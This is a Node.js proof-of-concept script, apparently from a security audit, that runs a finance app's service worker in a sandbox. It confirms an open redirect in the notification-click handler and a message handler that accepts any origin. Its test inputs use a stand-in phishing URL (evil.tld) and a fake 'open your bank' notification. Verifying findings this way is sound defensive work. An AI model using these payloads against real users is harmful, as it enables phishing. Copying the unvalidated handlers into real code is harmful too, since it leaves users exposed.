#!/usr/bin/env node
/**
 * PoC aislado para NEW-08 — Service Worker `public/sw.js`.
 *
 * Carga el SW real en un sandbox `node:vm` con APIs simuladas y demuestra:
 *   1. `notificationclick` pasa `data.url` sin validar origen a
 *      `clients.openWindow()` / `client.navigate()` (open redirect).
 *   2. `message` acepta `SHOW_LOCAL_NOTIFICATION` sin comprobar
 *      `event.origin` ni `event.source`.
 *
 * No toca red, navegador real ni producción. Uso: node poc-new08-sw-redirect.mjs
 */
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";
import vm from "node:vm";

const here = dirname(fileURLToPath(import.meta.url));
const swPath = resolve(here, "../../../public/sw.js");
const source = readFileSync(swPath, "utf8");

const handlers = new Map();
const opened = [];
const shown = [];

const self = {
  location: { origin: "https://app.financepal.mx" },
  registration: {
    showNotification: async (title, options) => {
      shown.push({ title, url: options?.data?.url });
    },
  },
  clients: {
    claim: () => {},
    matchAll: async () => [],
    openWindow: async (url) => {
      opened.push(url);
      return null;
    },
  },
  skipWaiting: () => {},
  addEventListener: (type, fn) => handlers.set(type, fn),
};

const context = vm.createContext({
  self,
  clients: self.clients,
  caches: {
    keys: async () => [],
    delete: async () => true,
  },
  console,
  Date,
});

vm.runInContext(source, context, { filename: "public/sw.js" });

function dispatch(type, event) {
  const handler = handlers.get(type);
  if (!handler) throw new Error(`Handler no encontrado: ${type}`);
  const pending = [];
  handler({ ...event, waitUntil: (p) => pending.push(Promise.resolve(p)) });
  return Promise.all(pending);
}

// 1) Click en una notificación con URL externa.
await dispatch("notificationclick", {
  notification: { close: () => {}, data: { url: "https://evil.tld/phish" } },
});

// 2) Mensaje con origen no confiable que muestra una notificación.
await dispatch("message", {
  origin: "https://evil.tld",
  source: null,
  data: {
    type: "SHOW_LOCAL_NOTIFICATION",
    payload: { title: "Aviso falso", body: "Abre tu banco", url: "https://evil.tld/phish" },
  },
});

console.log(`SW_FILE=${swPath}`);
console.log(`OPEN_WINDOW_URL=${opened.join(",") || "(none)"}`);
console.log(`CROSS_ORIGIN_MESSAGE_ACCEPTED=${shown.length > 0}`);
console.log(`SHOWN_URL=${shown[0]?.url ?? "(none)"}`);
console.log(
  opened.some((u) => !u.startsWith(self.location.origin))
    ? "RESULT=OPEN_REDIRECT_CONFIRMED"
    : "RESULT=NO_REDIRECT",
);
